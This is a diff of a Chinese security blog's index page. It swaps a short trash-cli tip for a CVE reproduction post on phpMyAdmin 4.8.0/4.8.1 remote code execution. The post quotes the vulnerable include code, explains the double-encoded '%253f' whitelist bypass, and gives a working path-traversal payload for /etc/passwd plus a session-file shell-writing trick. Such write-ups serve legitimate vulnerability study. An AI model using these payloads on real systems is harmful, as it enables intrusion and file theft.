@@ -66,90 +66,6 @@
       <div class="outer">
         <section id="main">
   
-    <article id="post-避免rm-rf-的悲惨命运" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2020/02/17/%E9%81%BF%E5%85%8Drm-rf-%E7%9A%84%E6%82%B2%E6%83%A8%E5%91%BD%E8%BF%90/" class="article-date">
-  <time class="dt-published" datetime="2020-02-17T13:44:07.000Z" itemprop="datePublished">2020-02-17</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2020/02/17/%E9%81%BF%E5%85%8Drm-rf-%E7%9A%84%E6%82%B2%E6%83%A8%E5%91%BD%E8%BF%90/">避免rm -rf *的悲惨命运</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="避免rm-rf-的悲惨命运"><a href="#避免rm-rf-的悲惨命运" class="headerlink" title="避免rm -rf *的悲惨命运"></a>避免rm -rf *的悲惨命运</h1><p>今天又是悲惨的一天,没认真看,rm -rf *错地方了</p>
-<p>为了再次避免悲惨命运</p>
-<ol>
-<li><p>还是不要老是用root用户了,创个日常的低权限用户,有必要时再登陆root</p>
-</li>
-<li><p>别用rm 啦,改用trash吧</p>
-</li>
-</ol>
-<h2 id="安装trash-cli"><a href="#安装trash-cli" class="headerlink" title="安装trash-cli"></a>安装trash-cli</h2><p><code>apt-get install trash-cli</code></p>
-<p><code>echo alias rm=trash &gt;&gt; ~/.zshrc</code></p>
-<p><code>source ~/.zshrc</code> </p>
-<h2 id="trash-cli-命令"><a href="#trash-cli-命令" class="headerlink" title="trash-cli 命令"></a>trash-cli 命令</h2><table>
-<thead>
-<tr>
-<th>command</th>
-<th>explain</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>trash-put/trash</td>
-<td>将文件或目录放进回收站</td>
-</tr>
-<tr>
-<td>trash-empty</td>
-<td>清空回收站</td>
-</tr>
-<tr>
-<td>trash-list</td>
-<td>列出回收站中的文件</td>
-</tr>
-<tr>
-<td>restore-trash</td>
-<td>还原回收站中的文件</td>
-</tr>
-<tr>
-<td>trash-rm</td>
-<td>删除回收站中的单个文件</td>
-</tr>
-</tbody></table>
-<h2 id="垃圾站所在位置"><a href="#垃圾站所在位置" class="headerlink" title="垃圾站所在位置"></a>垃圾站所在位置</h2><p><code>~/.local/share/Trash/files</code></p>
-<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/02/17/避免rm-rf-的悲惨命运/">http://blog.ccreater.top/2020/02/17/避免rm-rf-的悲惨命运/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://blog.ccreater.top/2020/02/17/%E9%81%BF%E5%85%8Drm-rf-%E7%9A%84%E6%82%B2%E6%83%A8%E5%91%BD%E8%BF%90/" data-id="cka3ckr3u0054v4v09ay48dwh" data-title="避免rm -rf *的悲惨命运" class="article-share-link">Share</a>
-      
-	  
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%9D%82/" rel="tag">杂</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-
-
-  
     <article id="post-域渗透" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2020/02/17/%E5%9F%9F%E6%B8%97%E9%80%8F/" class="article-date">
@@ -1569,6 +1485,118 @@ def poc(url):
 
 
   
+    <article id="post-phpmyadmin 4.8.1 rce" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2020/02/08/phpmyadmin%204.8.1%20rce/" class="article-date">
+  <time class="dt-published" datetime="2020-02-08T06:50:47.678Z" itemprop="datePublished">2020-02-08</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2020/02/08/phpmyadmin%204.8.1%20rce/">phpmyadmin 4.8.1 rce</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="phpmyadmin-4-8-1-rce"><a href="#phpmyadmin-4-8-1-rce" class="headerlink" title="phpmyadmin 4.8.1 rce"></a>phpmyadmin 4.8.1 rce</h1><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p> phpMyAdmin 4.8.0 and 4.8.1 </p>
+<p>登陆账号</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>环境:phpstudy 2018,windows 10</p>
+<p>漏洞位置:<code>index.php</code>:57</p>
+<pre><code class="php">if (! empty($_REQUEST[&#39;target&#39;])
+    &amp;&amp; is_string($_REQUEST[&#39;target&#39;])
+    &amp;&amp; ! preg_match(&#39;/^index/&#39;, $_REQUEST[&#39;target&#39;])
+    &amp;&amp; ! in_array($_REQUEST[&#39;target&#39;], $target_blacklist)
+    &amp;&amp; Core::checkPageValidity($_REQUEST[&#39;target&#39;])
+) {
+    include $_REQUEST[&#39;target&#39;];
+    exit;
+}</code></pre>
+<p>非常明显的任意文件包含漏洞</p>
+<p>前面几个条件都很好满足,我们看下最后一个<code>Core::checkPageValidity($_REQUEST[&#39;target&#39;])</code></p>
+<p>跟进去</p>
+<pre><code class="php">public static function checkPageValidity(&amp;$page, array $whitelist = [])
+    {
+        if (empty($whitelist)) {
+            $whitelist = self::$goto_whitelist;
+        }
+        if (! isset($page) || !is_string($page)) {
+            return false;
+        }
+
+        if (in_array($page, $whitelist)) {
+            return true;
+        }
+
+        $_page = mb_substr(
+            $page,
+            0,
+            mb_strpos($page . &#39;?&#39;, &#39;?&#39;)
+        );
+        if (in_array($_page, $whitelist)) {
+            return true;
+        }
+
+        $_page = urldecode($page);
+        $_page = mb_substr(
+            $_page,
+            0,
+            mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)
+        );
+        if (in_array($_page, $whitelist)) {
+            return true;
+        }
+
+        return false;
+    }</code></pre>
+<p>要返回<code>true</code>的话,需要<code>$page</code>从开头到第一个<code>?</code>之间的字符串在白名单中,有以下白名单</p>
+<pre><code class="php">array (
+  0 =&gt; &#39;db_datadict.php&#39;,
+....
+)</code></pre>
+<p>因为复现环境是在windows下,windows文件名不能包含<code>?</code>,所以<code>db_datadict.php?</code>会变为<code>db_datadict.php</code>是一个已经存在的文件,我们便无法用<code>../</code>来穿梭目录了,但是我们可以看到<code>$_page = urldecode($page);</code></p>
+<p>所以我们可以构造<code>db_datadict.php%253f</code>来绕过</p>
+<p>通用的payload:</p>
+<p><code>db_datadict.php%253f../../../../../../../../../../../etc/passwd</code></p>
+<p>可以通过<code>SELECT &#39;&lt;?=phpinfo()?&gt;&#39;;</code> 来写shell到我们的session中</p>
+<p><img src="https://i.loli.net/2020/02/08/p4l2vM6JOLsTGCd.png" alt="image1794"></p>
+<p><img src="https://i.loli.net/2020/02/08/wUZHdhJx9KSQRG7.png" alt="image1859"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><code>db_datadict.php%253f../../../../../../../../../../../etc/passwd</code></p>
+<p>可以通过<code>SELECT &#39;&lt;?=phpinfo()?&gt;&#39;;</code> 来写shell到我们的session中</p>
+<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： [<a href="http://blog.ccreater.top/2020/02/08/phpmyadmin">http://blog.ccreater.top/2020/02/08/phpmyadmin</a> 4.8.1 rce/](<a href="http://blog.ccreater.top/2020/02/08/phpmyadmin">http://blog.ccreater.top/2020/02/08/phpmyadmin</a> 4.8.1 rce/) <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://blog.ccreater.top/2020/02/08/phpmyadmin%204.8.1%20rce/" data-id="cka3ckr37003cv4v0epy0cmod" data-title="phpmyadmin 4.8.1 rce" class="article-share-link">Share</a>
+      
+	  
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+
+
+  
 
 
   <nav id="page-nav">
@@ -1626,10 +1654,6 @@ def poc(url):
       <ul>
         
           <li>
-            <a href="/2020/09/26/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22020wp/">巅峰极客2020wp</a>
-          </li>
-        
-          <li>
             <a href="/2020/09/21/2020-QWB-final-bjyadmin/">2020-QWB-final-bjyadmin</a>
           </li>
         
@@ -1643,6 +1667,10 @@ def poc(url):
         
           <li>
             <a href="/2020/08/21/ciscn2020%E9%A2%84%E9%80%89%E8%B5%9B/">ciscn2020预选赛</a>
+          </li>
+        
+          <li>
+            <a href="/2020/08/21/ciscn2020easyphp%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/">ciscn2020easyphp出题笔记</a>
           </li>
         
       </ul>
